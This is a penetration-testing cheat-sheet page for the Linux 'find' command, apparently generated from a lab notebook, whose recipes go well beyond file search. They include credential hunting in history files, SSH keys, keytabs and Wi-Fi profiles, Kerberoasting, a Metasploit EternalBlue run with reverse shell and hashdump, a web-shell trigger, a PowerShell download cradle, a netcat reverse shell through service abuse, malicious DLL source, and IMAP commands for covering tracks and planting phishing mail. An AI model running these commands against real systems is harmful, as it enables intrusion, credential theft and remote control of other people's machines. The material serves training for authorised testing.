---
title: "find"
sidebarTitle: "find"
description: "Search Linux paths by name, type or permissions."
keywords: ["find"]
boost: 10
hideFooterPagination: true
---

{/* Generated from Commands/find.md. Edit the Markdown source, then run scripts/sync_site.py. */}

Replace UPPER_CASE values with your lab values.

[Search this tool’s saved examples](/commands/notebook?tool=find) · [All tools](/index)

## Commands

**Linux target**

```bash
find / -name "*.conf" 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find . -type f -mmin -10
```

[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)

## Notebook recipes

43 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.

<AccordionGroup>

<Accordion title="AD Certificate Services: Quick Reference">

### AD Certificate Services: Quick Reference

**AD Certificate Services: Quick Reference**

```bash
# find vulnerable templates
certipy find -u USER@$DOMAIN -p PASS -dc-ip $DC -vulnerable -stdout
```

</Accordion>

<Accordion title="5. Credential hunting (Linux)">

### 5. Credential hunting (Linux)

**Active Directory Attack Path: Worked Lab**

```bash
sudo -l                                               # #1 — instant win if misconfigured
cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null
history | grep -iE "ssh|mysql|psql|password|sshpass|curl|wget"
ls -la ~/.ssh /home/*/.ssh 2>/dev/null                # keys to pivot with
grep -riI "pass\|secret\|cred" /etc /opt /var/www /home 2>/dev/null | grep -v Binary
# Kerberos artifacts (domain-joined Linux) -> Pass-the-Ticket:
find / -name '*.keytab' 2>/dev/null; ls -la /etc/krb5.keytab 2>/dev/null
ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
```

</Accordion>

<Accordion title="Kerberos / Spns">

### Kerberos / Spns

**Active Directory Enumeration Commands**

```bash
GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
    # Find user accounts with registered SPNs

GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
    # Request TGS tickets for Kerberoasting

GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass
    # Find accounts vulnerable to AS-REP roasting

GetNPUsers.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
    # Query for AS-REP roastable accounts using credentials
```

</Accordion>

<Accordion title="Powerview">

### Powerview

**Active Directory Enumeration Commands**

```powershell
Get-DomainUser
    # Enumerate domain users

Get-DomainUser <USER>
    # Get information about a specific domain user

Get-DomainGroup
    # Enumerate domain groups

Get-DomainGroupMember "<GROUP>"
    # Show members of a domain group

Get-DomainUser <USER> -Properties memberof
    # Show a user's AD group memberships

Get-DomainComputer
    # Enumerate domain computers

Get-DomainController
    # Find Domain Controllers

Get-DomainSPNTicket
    # Identify/request Kerberos tickets associated with SPNs
```

</Accordion>

<Accordion title="10. Ghidra — reading the native crypto">

### 10. Ghidra — reading the native crypto

**Android Banking Trojan: Reverse-Engineering Walkthrough**

```bash
readelf -S libextpool30.so      # find .text/.rodata addresses vs file offsets
# the shift here was 0x1000, e.g. function at Ghidra 0x101b1c → file offset 0xb1c
xxd -s 0xb1c -l 16 libextpool30.so   # confirmed an AArch64 prologue: ff c3 05 d1 (sub sp,...)
```

</Accordion>

<Accordion title="Linux">

### Linux

**Common Services: Full Module Reference**

```bash
grcic550@htb[/htb]$ find /mnt/Finance/ -name *cred*

/mnt/Finance/Contracts/private/credentials.txt
```

**Privilege Escalation: Choose a Checklist**

Context from the notebook: find / -perm -4000 -type f 2>/dev/null  → SUID binary list → GTFOBins lookup

```text
find / -perm -4000 -type f 2>/dev/null
```

</Accordion>

<Accordion title="Windows">

### Windows

**Common Services: Full Module Reference**

```cmd
C:\htb> dir n: /a-d /s /b | find /c ":\"

29302
```

**Common Services: Full Module Reference**

```bash
dir n: /a-d /s /b | find /c ":\"

Syntax	Description
dir	Application
n:	Directory or drive to search
/a-d	/a is the attribute and -d means not directories
/s	Displays files in a specified directory and all subdirectories
/b	Uses bare format (no heading information or summary)

The following command | find /c ":\\" process the output of dir n: /a-d /s /b to count how many files exist in the directory and subdirectories. You can use dir /? to see the full help. Searching through 29,302 files is time consuming, scripting and command line utilities can help us speed up the search. With dir we can search for specific names in files such as:

    cred
    password
    users
    secrets
    key
```

</Accordion>

<Accordion title="Common Google Dorks">

### Common Google Dorks

**DNS and Web Reconnaissance: Full Workflow**

```text
# Find login/admin pages
site:example.com inurl:login
site:example.com (inurl:login OR inurl:admin)

# Find exposed files
site:example.com filetype:pdf
site:example.com (filetype:xls OR filetype:docx)

# Find config files
site:example.com inurl:config.php
site:example.com (ext:conf OR ext:cnf)

# Find database backups
site:example.com inurl:backup
site:example.com filetype:sql
```

</Accordion>

<Accordion title="Bypassing filters">

### Bypassing filters

**File Upload Testing: Quick Reference**

```bash
# find where it landed, then trigger
curl "http://$IP/uploads/shell.php?c=id"
```

</Accordion>

<Accordion title="5. Filename-based hunting">

### 5. Filename-based hunting

**Find Credentials in Network Shares**

```bash
# files with interesting names
find . -type f \( -iname "*pass*" -o -iname "*cred*" -o -iname "*secret*" -o -iname "*config*" -o -iname "*backup*" -o -iname "*initial*" -o -iname "unattend*" -o -iname "sysprep*" -o -iname "autounattend*" \) 2>/dev/null | grep -v Tools/

# password manager databases
find . -type f \( -iname "*.kdbx" -o -iname "*.psafe3" -o -iname "*.1pux" \) 2>/dev/null

# files by interesting extension
find . -type f \( -iname "*.ini" -o -iname "*.cfg" -o -iname "*.conf" -o -iname "*.config" -o -iname "*.env" -o -iname "*.ps1" -o -iname "*.bat" -o -iname "*.cmd" -o -iname "*.vbs" -o -iname "*.xml" \) 2>/dev/null | grep -v Tools/
```

</Accordion>

<Accordion title="9. Beyond plaintext — handle binary docs">

### 9. Beyond plaintext — handle binary docs

**Find Credentials in Network Shares**

```bash
# convert all office docs to txt
mkdir -p /tmp/converted
find . -type f \( -iname "*.docx" -o -iname "*.xlsx" -o -iname "*.pdf" -o -iname "*.pptx" \) 2>/dev/null | while read f; do
  libreoffice --headless --convert-to txt "$f" --outdir /tmp/converted >/dev/null 2>&1
done

grep -riE "passw|${DOMAIN}\\\\|cred" /tmp/converted/
```

</Accordion>

<Accordion title="Find Credentials in Network Shares">

### Find Credentials in Network Shares

**Find Credentials in Network Shares**

```bash
# the domain prefix (most reliable signal)
grep -ri "DOMAINNAME\\\\" .

# UPN format
grep -riE "[a-z]+@domain\.local" .

# runas / net use / Invoke-Command patterns - operators leak creds in commands
grep -riE "runas|net use|Invoke-Command|New-PSSession|ConvertTo-SecureString" .

# anything with "service account" / "svc_" in filenames
find . -iname "*svc*" -o -iname "*service*account*"
```

</Accordion>

<Accordion title="Find Credentials on Linux">

### Find Credentials on Linux

**Find Credentials on Linux**

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extensions: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core";done
```

**Find Credentials on Linux**

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

**Find Credentials on Linux**

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

**Find Credentials on Linux**

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

</Accordion>

<Accordion title="Files to Always Check">

### Files to Always Check

**Footprinting: Service-by-Service Lab Workflow**

```bash
# History files (often contain passwords in commands)
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.viminfo

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Mail
ls -la ~/Maildir/cur/
cat ~/Maildir/cur/*
ls -la ~/mail/

# Other users
cat /etc/passwd | grep -v nologin | grep -v false
ls /home/

# Find files by name
find / -iname "*htb*" 2>/dev/null
find / -iname "*password*" 2>/dev/null
find / -iname "*config*" 2>/dev/null

# Windows equivalents
dir C:\Users
type C:\Users\<user>\Desktop\flag.txt
```

</Accordion>

<Accordion title="First look at privilege escalation">

### First look at privilege escalation

**Getting Started with Penetration Testing**

```bash
# Linux
sudo -l                       # what can I run as root?
id; whoami
find / -perm -4000 2>/dev/null   # SUID binaries
uname -a                      # kernel version (kernel exploits)

# Windows
whoami /priv                  # dangerous privileges?
systeminfo                    # patch level / OS
```

</Accordion>

<Accordion title="5. Processes &amp; jobs">

### 5. Processes & jobs

**Kali Terminal, tmux, zsh, and Vim**

```bash
Ctrl+c              # kill the running foreground command
Ctrl+z              # SUSPEND it (pauses, gives prompt back)
bg                  # resume the suspended job in background
fg                  # bring it back to foreground
jobs                # list background/suspended jobs
cmd &               # run in background from the start
ps aux | grep ssh   # find a process
kill <PID>          # terminate by PID
kill -9 <PID>       # force kill
pkill nmap          # kill by name
htop                # interactive process viewer (apt install htop)
```

</Accordion>

<Accordion title="Finding things">

### Finding things

**Kali Terminal, tmux, zsh, and Vim**

```bash
find / -name "*.conf" 2>/dev/null      # find by name, hide permission errors
find . -type f -mmin -10               # files modified in last 10 min
locate sqlmap                          # fast name search (run: sudo updatedb first)
which nmap                             # path of a command
whereis nmap
grep -ri "password" /etc 2>/dev/null   # recursive, case-insensitive search in files
```

</Accordion>

<Accordion title="Files containing passwords">

### Files containing passwords

**Linux Privilege Escalation: Full Checklist**

```powershell
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

</Accordion>

<Accordion title="Find SUID binaries">

### Find SUID binaries

**Linux Privilege Escalation: Full Checklist**

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

</Accordion>

<Accordion title="In memory passwords">

### In memory passwords

**Linux Privilege Escalation: Full Checklist**

```ps1
# Find PID
ps -eo pid,command

# Core dump PID
gcore <pid> -o dumpfile

# Search for passwords
strings -n 5 dumpfile | grep -i pass
```

</Accordion>

<Accordion title="Last edited files">

### Last edited files

**Linux Privilege Escalation: Full Checklist**

```powershell
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
```

</Accordion>

<Accordion title="Sensitive files">

### Sensitive files

**Linux Privilege Escalation: Full Checklist**

```ps1
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

</Accordion>

<Accordion title="Writable files">

### Writable files

**Linux Privilege Escalation: Full Checklist**

```powershell
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

</Accordion>

<Accordion title="Core workflow — search → use → set → run">

### Core workflow — search → use → set → run

**Metasploit Framework: Startup to Sessions**

```bash
msf6 > search type:exploit eternalblue     # find modules (filter by type/platform/cve)
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > info                    # what it does, options, targets
msf6 exploit(...) > show options            # required/optional settings
msf6 exploit(...) > set RHOSTS 10.10.10.40  # target
msf6 exploit(...) > set LHOST tun0          # YOUR ip (where the shell calls back)
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > show payloads           # compatible payloads
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > check                    # (if supported) test vuln without firing
msf6 exploit(...) > run                       # or 'exploit'
```

</Accordion>

<Accordion title="Post-exploitation &amp; pivoting">

### Post-exploitation & pivoting

**Metasploit Framework: Startup to Sessions**

```bash
meterpreter > run post/windows/gather/hashdump
meterpreter > run post/multi/recon/local_exploit_suggester   # find privesc paths
msf6 > use post/windows/manage/enable_rdp

# Pivoting: route traffic through a compromised host to reach an internal subnet
meterpreter > run autoroute -s 172.16.5.0/24
msf6 > use auxiliary/server/socks_proxy        # then proxychains other tools through it
```

</Accordion>

<Accordion title="Port selection">

### Port selection

**Nmap: Host Discovery, Scanning, and Output**

```bash
nmap -p- --min-rate 5000 <target>          # find every open port fast
sudo nmap -sCV -p 22,80,445 <target>       # then -sC -sV only on those
```

</Accordion>

<Accordion title="Footprinting &amp; SID enumeration">

### Footprinting & SID enumeration

**Oracle Database and TNS Enumeration**

```bash
sudo nmap -p1521 -sV <IP> --open                          # version + confirm listener
sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute # brute-force SIDs

# ODAT (Oracle Database Attacking Tool)
python3 odat.py sidguesser -s <IP> -p 1521                 # find valid SIDs
python3 odat.py passwordguesser -s <IP> -p 1521 -d XE      # brute creds for SID XE
python3 odat.py all -s <IP> -d XE -U <user> -P <pass>      # run every attack module
```

</Accordion>

<Accordion title="Search for Keytabs">

### Search for Keytabs

**Pass the Ticket from Linux**

```bash
find / -name "*keytab*" -ls 2>/dev/null
```

</Accordion>

<Accordion title="Hunting for encrypted files">

### Hunting for encrypted files

**Password Attacks: Cracking, Files, and Credential Stores**

```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

</Accordion>

<Accordion title="Quick-start command cheat (run first, always)">

### Quick-start command cheat (run first, always)

**Privilege Escalation: Choose a Checklist**

```bash
# 1. Automated
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out

# 2. Manual "big 6"
id; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab; uname -a
```

</Accordion>

<Accordion title="Driving IMAP">

### Driving IMAP

**Read and Search Email with POP3 and IMAP**

```text
# Find credentials across an entire large mailbox in one query:
a6 SEARCH TEXT "password"

# Cover your tracks — mark a message you read back as Unread:
a7 STORE 1 -FLAGS (\Seen)

# Delete and permanently purge a message:
a8 STORE 1 +FLAGS (\Deleted)
a9 EXPUNGE

# Forge a message straight into the mailbox (e.g. plant a phishing link):
# {52} is the exact byte length of the literal that follows, INCLUDING the \r\n line endings.
a10 APPEND INBOX {52}
Subject: Fake Email
Here is the malicious link.
```

</Accordion>

<Accordion title="Mental model">

### Mental model

**The Penetration Testing Process**

```text
Paperwork first (scope + authorization)
        ↓
Map everything (recon) ──┐
        ↓                │ every new cred/host
Find weaknesses          │ loops you back here
        ↓                │
Get a foothold           │
        ↓                │
Escalate + loot + pivot ─┘
        ↓
Prove it, write it up, clean up
```

</Accordion>

<Accordion title="EoP - Incorrect permissions in services">

### EoP - Incorrect permissions in services

**Windows Privilege Escalation: Full Checklist**

```powershell
# find missing DLL 
- Find-PathDLLHijack PowerUp.ps1
- Process Monitor : check for "Name Not Found"

# compile a malicious dll
- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"

# content of windows_dll.c
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

**Windows Privilege Escalation: Full Checklist**

```powershell
$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

</Accordion>

<Accordion title="EoP - Unquoted Service Paths">

### EoP - Unquoted Service Paths

**Windows Privilege Escalation: Full Checklist**

```powershell
# find the vulnerable application
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"

...
[*] Checking for unquoted service paths...
ServiceName   : BBSvc
Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
...

# automatic exploit
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

</Accordion>

<Accordion title="Wifi passwords">

### Wifi passwords

**Windows Privilege Escalation: Full Checklist**

```batch
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

</Accordion>

<Accordion title="Typical null-session workflow">

### Typical null-session workflow

**rpcclient: Users, Groups, and Domain Policy**

```bash
rpcclient -U "" -N <target>
# then, at the prompt:
querydominfo          # orient: what domain/role is this?
enumdomusers          # grab the username list
getdompwinfo          # check lockout BEFORE any spraying
enumdomgroups         # find privileged groups
querygroupmem 0x200   # 0x200 = 512 = Domain Admins → who's an admin?
netshareenumall       # where are the shares?
```

</Accordion>

<Accordion title="Spawning Interactive TTY Shells">

### Spawning Interactive TTY Shells

**Shells, Payloads, and Interactive TTYs**

Context from the notebook: Find find . -exec /bin/sh \; -quit

```text
find . -exec /bin/sh \; -quit
```

</Accordion>

</AccordionGroup>
